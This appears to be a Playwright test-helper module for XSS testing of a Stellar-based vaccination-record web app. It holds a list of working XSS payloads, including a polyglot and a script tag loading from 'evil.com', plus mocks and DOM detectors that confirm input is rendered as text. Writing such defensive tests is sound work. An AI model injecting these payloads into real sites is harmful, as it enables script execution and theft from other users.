/**
 * Common XSS payloads and test utilities
 * 
 * This file contains reusable XSS attack vectors and helper functions
 * for security testing across the application.
 */

/**
 * Common XSS attack payloads
 */
export const XSS_PAYLOADS = {
  // Basic script injection
  script: '<script>alert("XSS")</script>',
  scriptWithSrc: '<script src="http://evil.com/xss.js"></script>',
  
  // Image-based attacks
  img: '<img src=x onerror=alert("XSS")>',
  imgWithSpace: '<img src=x onerror="alert(\'XSS\')">',
  imgDataUri: '<img src="data:text/html,<script>alert(\'XSS\')</script>">',
  
  // SVG-based attacks
  svg: '<svg onload=alert("XSS")>',
  svgWithScript: '<svg><script>alert("XSS")</script></svg>',
  svgAnimate: '<svg><animate onbegin=alert("XSS") attributeName=x dur=1s>',
  
  // Iframe attacks
  iframe: '<iframe src="javascript:alert(\'XSS\')">',
  iframeDataUri: '<iframe src="data:text/html,<script>alert(\'XSS\')</script>">',
  
  // Event handler attacks
  eventHandler: '<div onclick="alert(\'XSS\')">Click</div>',
  onmouseover: '<div onmouseover="alert(\'XSS\')">Hover</div>',
  onerror: '<body onerror="alert(\'XSS\')">',
  
  // JavaScript protocol
  javascript: 'javascript:alert("XSS")',
  javascriptVoid: 'javascript:void(alert("XSS"))',
  
  // Data URI attacks
  dataUri: 'data:text/html,<script>alert("XSS")</script>',
  dataUriBase64: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
  
  // Object/embed attacks
  object: '<object data="javascript:alert(\'XSS\')">',
  embed: '<embed src="javascript:alert(\'XSS\')">',
  
  // Form-based attacks
  formAction: '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
  
  // Link-based attacks
  link: '<a href="javascript:alert(\'XSS\')">Click</a>',
  
  // Meta refresh
  metaRefresh: '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
  
  // Style-based attacks
  styleExpression: '<div style="background:url(javascript:alert(\'XSS\'))">',
  
  // Template literals (for testing in JS contexts)
  templateLiteral: '${alert("XSS")}',
  
  // Unicode/encoding attacks
  unicodeScript: '<script>\\u0061lert("XSS")</script>',
  htmlEntities: '&lt;script&gt;alert("XSS")&lt;/script&gt;',
  
  // Polyglot payloads (work in multiple contexts)
  polyglot: 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert("XSS")//\'>',
};

/**
 * HTML entities for testing proper escaping
 */
export const HTML_ENTITIES = {
  basic: '&lt;script&gt;alert("XSS")&lt;/script&gt;',
  quotes: '&quot;&apos;&amp;',
  mixed: 'Test &lt;b&gt;bold&lt;/b&gt; &amp; &quot;quotes&quot;',
  allCommon: '&lt; &gt; &amp; &quot; &apos; &#x27; &#x2F;',
};

/**
 * Valid Stellar address patterns for testing
 */
export const STELLAR_ADDRESSES = {
  valid: 'GTEST1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
  validIssuer: 'GISSUER1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ2345',
  validPatient: 'GPATIENT1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ23456',
};

/**
 * Create a mock vaccination record with optional malicious data
 */
export function createMockRecord(overrides = {}) {
  return {
    token_id: '1',
    vaccine_name: 'COVID-19',
    date_administered: '2024-01-15',
    issuer: STELLAR_ADDRESSES.validIssuer,
    patient: STELLAR_ADDRESSES.validPatient,
    ...overrides,
  };
}

/**
 * Create a mock API response with records
 */
export function createMockRecordsResponse(records) {
  return {
    records: Array.isArray(records) ? records : [records],
  };
}

/**
 * Create a mock verify response
 */
export function createMockVerifyResponse(records, vaccinated = true) {
  return {
    vaccinated,
    record_count: records.length,
    records,
  };
}

/**
 * Setup XSS detection listeners on a page
 * This should be called in beforeEach for all XSS tests
 */
export function setupXSSDetection(page) {
  // Monitor console for XSS indicators
  page.on('console', msg => {
    const text = msg.text();
    if (text.includes('XSS') || text.includes('alert')) {
      throw new Error(`Potential XSS detected in console: ${text}`);
    }
  });

  // Monitor dialogs (alert, confirm, prompt)
  page.on('dialog', async dialog => {
    throw new Error(`Unexpected dialog (potential XSS): ${dialog.message()}`);
  });

  // Monitor page errors
  page.on('pageerror', error => {
    // Some errors might indicate XSS attempts
    if (error.message.includes('XSS')) {
      throw new Error(`Page error with XSS indicator: ${error.message}`);
    }
  });
}

/**
 * Mock Freighter wallet connection
 */
export async function mockFreighterConnection(page, publicKey, role = 'patient') {
  await page.addInitScript((key, userRole) => {
    window.freighter = {
      isConnected: async () => true,
      getPublicKey: async () => key,
      signTransaction: async (xdr) => xdr,
    };
    
    // Mock role if needed
    window.__mockRole = userRole;
  }, publicKey, role);
}

/**
 * Mock authentication endpoints
 */
export async function mockAuthEndpoints(page, publicKey, role = 'patient') {
  await page.route('**/auth/challenge', async route => {
    await route.fulfill({
      status: 200,
      contentType: 'application/json',
      body: JSON.stringify({ challenge: 'test-challenge-' + Date.now() }),
    });
  });

  await page.route('**/auth/verify', async route => {
    await route.fulfill({
      status: 200,
      contentType: 'application/json',
      body: JSON.stringify({ publicKey, role }),
    });
  });
}

/**
 * Mock vaccination records endpoint
 */
export async function mockVaccinationRecords(page, records) {
  await page.route('**/vaccination/*', async route => {
    await route.fulfill({
      status: 200,
      contentType: 'application/json',
      body: JSON.stringify(createMockRecordsResponse(records)),
    });
  });
}

/**
 * Mock verify endpoint
 */
export async function mockVerifyEndpoint(page, wallet, records, vaccinated = true) {
  await page.route(`**/verify/${wallet}`, async route => {
    await route.fulfill({
      status: 200,
      contentType: 'application/json',
      body: JSON.stringify(createMockVerifyResponse(records, vaccinated)),
    });
  });
}

/**
 * Verify that no malicious elements were created in the DOM
 */
export async function verifyNoMaliciousElements(page) {
  // Check for script tags
  const scriptCount = await page.locator('script[src*="evil"]').count();
  if (scriptCount > 0) {
    throw new Error('Malicious script tag found in DOM');
  }

  // Check for iframes with javascript: protocol
  const iframeCount = await page.locator('iframe[src^="javascript:"]').count();
  if (iframeCount > 0) {
    throw new Error('Malicious iframe found in DOM');
  }

  // Check for images with onerror handlers
  const imgCount = await page.locator('img[onerror]').count();
  if (imgCount > 0) {
    throw new Error('Image with onerror handler found in DOM');
  }

  // Check for SVG with onload handlers
  const svgCount = await page.locator('svg[onload]').count();
  if (svgCount > 0) {
    throw new Error('SVG with onload handler found in DOM');
  }
}

/**
 * Verify text is rendered literally (not as HTML)
 */
export async function verifyTextIsLiteral(page, selector, expectedText) {
  const element = page.locator(selector);
  const text = await element.textContent();
  
  if (!text.includes(expectedText)) {
    throw new Error(`Expected text "${expectedText}" not found in element`);
  }
  
  return text;
}

/**
 * Test a payload against a specific component
 */
export async function testPayloadAgainstComponent(page, payload, componentSelector) {
  // Setup detection
  setupXSSDetection(page);
  
  // Wait for component
  await page.waitForSelector(componentSelector);
  
  // Verify no malicious elements
  await verifyNoMaliciousElements(page);
  
  // Verify payload is rendered as text
  const element = page.locator(componentSelector).first();
  const text = await element.textContent();
  
  return text;
}

/**
 * Generate a malicious Stellar address (for testing)
 */
export function createMaliciousStellarAddress(payload) {
  // Stellar addresses are 56 chars starting with G
  // Truncate or pad the payload to fit
  const sanitized = payload.slice(0, 55);
  return 'G' + sanitized.padEnd(55, '0');
}

/**
 * Common test patterns
 */
export const TEST_PATTERNS = {
  // Verify element exists and contains literal text
  async verifyLiteralText(page, selector, expectedSubstring) {
    const element = page.locator(selector);
    await element.waitFor();
    const text = await element.textContent();
    return text.includes(expectedSubstring);
  },

  // Verify element does not exist
  async verifyElementNotExists(page, selector) {
    const count = await page.locator(selector).count();
    return count === 0;
  },

  // Verify no alerts were triggered
  async verifyNoAlerts(page, action) {
    let alertTriggered = false;
    
    page.once('dialog', async dialog => {
      alertTriggered = true;
      await dialog.dismiss();
    });
    
    await action();
    
    return !alertTriggered;
  },
};
